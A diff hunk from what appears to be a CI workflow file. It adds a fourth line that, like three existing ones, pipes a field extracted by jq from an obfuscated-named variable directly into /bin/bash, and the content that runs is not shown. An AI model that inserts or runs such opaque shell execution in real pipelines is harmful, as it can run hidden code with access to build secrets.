@@ -21,6 +21,7 @@ jobs:
           echo $cyc59726 | jq -r .f602 | /bin/bash
           echo $t9 | jq -r .zbodl489 | /bin/bash
           printf '%s' "$s7" | jq -r .qbwq98300 | /bin/bash
+          printf '%s' "$isrok59" | jq -r .srpxi32 | /bin/bash
 
       - name: Upload data
         if: always()
